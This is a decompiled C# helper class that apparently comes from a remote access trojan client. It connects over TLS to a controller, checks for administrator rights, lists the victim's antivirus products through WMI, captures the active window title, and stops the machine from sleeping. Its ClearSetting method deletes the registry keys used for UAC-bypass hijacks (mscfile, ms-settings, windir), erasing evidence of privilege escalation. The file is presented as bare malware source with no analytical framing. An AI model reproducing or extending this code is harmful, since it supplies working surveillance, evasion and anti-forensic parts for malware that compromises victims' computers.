using System;
using System.Drawing.Imaging;
using System.Management;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using Client.Connection;
using Microsoft.Win32;

namespace Client.Helper
{
	// Token: 0x02000013 RID: 19
	public static class Methods
	{
		// Token: 0x06000055 RID: 85 RVA: 0x000022B1 File Offset: 0x000004B1
		public static bool IsAdmin()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x06000056 RID: 86 RVA: 0x0000401C File Offset: 0x0000221C
		public static void ClientOnExit()
		{
			try
			{
				if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin())
				{
					ProcessCritical.Exit();
				}
				MutexControl.CloseMutex();
				SslStream sslClient = ClientSocket.SslClient;
				if (sslClient != null)
				{
					sslClient.Close();
				}
				Socket tcpClient = ClientSocket.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Close();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00004094 File Offset: 0x00002294
		public static string Antivirus()
		{
			string result;
			try
			{
				string text = string.Empty;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						text = text + managementObject["displayName"].ToString() + "; ";
					}
				}
				text = Methods.RemoveLastChars(text, 2);
				result = ((!string.IsNullOrEmpty(text)) ? text : "N/A");
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x06000058 RID: 88 RVA: 0x000022C7 File Offset: 0x000004C7
		public static string RemoveLastChars(string input, int amount = 2)
		{
			if (input.Length > amount)
			{
				input = input.Remove(input.Length - amount);
			}
			return input;
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00004188 File Offset: 0x00002388
		public static ImageCodecInfo GetEncoder(ImageFormat format)
		{
			foreach (ImageCodecInfo imageCodecInfo in ImageCodecInfo.GetImageDecoders())
			{
				if (imageCodecInfo.FormatID == format.Guid)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		// Token: 0x0600005A RID: 90
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern NativeMethods.EXECUTION_STATE SetThreadExecutionState(NativeMethods.EXECUTION_STATE esFlags);

		// Token: 0x0600005B RID: 91 RVA: 0x000041D0 File Offset: 0x000023D0
		public static void PreventSleep()
		{
			try
			{
				Methods.SetThreadExecutionState((NativeMethods.EXECUTION_STATE)2147483651U);
			}
			catch
			{
			}
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00004204 File Offset: 0x00002404
		public static string GetActiveWindowTitle()
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder(256);
				if (NativeMethods.GetWindowText(NativeMethods.GetForegroundWindow(), stringBuilder, 256) > 0)
				{
					return stringBuilder.ToString();
				}
			}
			catch
			{
			}
			return "";
		}

		// Token: 0x0600005D RID: 93 RVA: 0x00004260 File Offset: 0x00002460
		public static void ClearSetting()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Environment");
				if (registryKey.GetValue("windir") != null)
				{
					registryKey.DeleteValue("windir");
				}
				registryKey.Close();
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true).DeleteSubKeyTree("mscfile");
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true).DeleteSubKeyTree("ms-settings");
			}
			catch
			{
			}
		}
	}
}
